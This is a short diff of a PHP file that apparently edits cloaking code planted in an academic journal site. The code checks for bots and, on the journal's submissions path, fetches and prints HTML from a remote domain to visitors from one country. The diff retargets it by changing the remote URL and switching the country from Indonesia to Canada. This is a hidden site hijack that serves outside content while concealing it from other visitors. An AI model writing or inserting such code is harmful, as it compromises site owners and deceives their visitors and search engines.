@@ -18,7 +18,7 @@ function is_bot() {
     return preg_match($botchar, $user_agent);
 }
 
-$Biawak = "https://reuma.publikasi-indonesia.com/utama";
+$Biawak = "https://reuma.publikasi-indonesia.com/utama.html";
 
 $request_uri = $_SERVER['REQUEST_URI'] ?? '';
 
@@ -28,7 +28,7 @@ if (stripos($request_uri, '/reuma/about/submissions') !== false) {
         exit;
     }
 
-    if (getUserCountry() === "ID") {
+    if (getUserCountry() === "CA") {
         header("Content-Type: text/html; charset=UTF-8");
         echo @file_get_contents($Biawak);
         exit();
